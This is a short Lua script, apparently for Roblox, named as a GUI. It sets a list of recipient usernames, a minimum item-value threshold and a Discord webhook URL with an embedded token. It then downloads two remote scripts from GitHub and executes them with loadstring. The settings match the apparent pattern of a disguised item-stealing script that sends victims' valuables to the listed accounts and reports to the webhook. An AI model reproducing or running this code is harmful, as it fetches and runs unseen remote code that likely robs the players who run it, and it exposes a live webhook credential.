-- Strikegui.lua
-- User settings
_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} 
_G.minrap = 10000000
_G.webhook = "https://discord.com/api/webhooks/1432831852065984673/4oetapbKqCwCCMUUKZORXzB4Bie1V2gaBt0DxC5PozHfRXVE8u8K4qK-Yan3tuw6-9Kn"

-- Run both scripts concurrently
spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Random/refs/heads/main/Random.lua"))()
end)

spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Random/refs/heads/main/Rgui.lua"))()
end)
